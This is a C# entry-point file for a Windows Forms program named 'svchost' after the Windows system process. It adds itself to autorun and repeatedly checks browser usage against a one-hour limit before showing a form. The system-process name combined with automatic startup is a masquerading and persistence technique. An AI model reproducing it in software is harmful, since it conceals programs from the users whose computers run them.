using svchost.Controller;
using svchost.View;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace svchost
{
    internal static class Program
    {

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string path = Environment.CurrentDirectory;
            string name = "svchost";

            CompController.AddToAutoRun(name, Path.Combine(path, name));

            Console.ReadLine();

            Thread thread = new Thread(Run);
            thread.Start();
        }

        private static void Run()
        {
            int limit = (int)(new TimeSpan(1, 0, 0)).TotalSeconds;

            while (true)
            {
                if(CompController.CheckBrowsers(limit))
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new MagicForm());
                }

                Thread.Sleep(2000);
            }
        }
    }
}
